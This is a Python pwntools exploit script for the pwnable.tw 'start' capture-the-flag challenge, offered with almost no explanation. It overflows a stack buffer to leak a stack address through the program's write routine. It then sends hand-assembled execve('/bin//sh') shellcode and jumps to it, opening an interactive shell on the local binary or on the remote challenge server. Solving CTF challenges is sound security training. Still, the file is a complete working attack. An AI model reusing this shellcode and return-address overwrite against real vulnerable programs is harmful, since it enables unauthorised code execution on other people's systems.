#!/usr/bin/env python3

from pwn import *
DUMMY = 0xdeadbeef
elf = ELF("./given/start")

def conn():
    if args.REMOTE:
        p = remote("chall.pwnable.tw", 10000)
    else:
        p = process([elf.path])
        if args.D:
            gdb.attach(p,
                """
                b *0x804809c
                """)
    return p

def shellcode():
    sc = asm("""
            xor ecx, ecx;
            xor edx, edx;
            push edx;
            push 0x68732f6e;
            push 0x69622f2f;
            push esp
            pop ebx
            push 0xb
            pop eax
            int 0x80
            """)
    return sc

def exploit():
    # info: objdump
    func_start_sys_write = 0x804808b

    p = conn()

    padding = b"a" * 0x14
    payload = padding + p32(func_start_sys_write)

    p.recvuntil(b"Let's start the CTF:")
    p.send(payload)

    p.recvuntil(payload)
    leak = p.recvn(4)
    stack_addr = u32(leak)
    print("leaked stack address:", hex(stack_addr))

    # The buffer "Let's start the CTF",
    # I will do a perfect leap
    buf = stack_addr - 0x14 - 0x4 - 0x4
    payload = shellcode().ljust(0x14 + 0x4 + 0x14, b"\x00") + p32(buf)
    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    exploit()
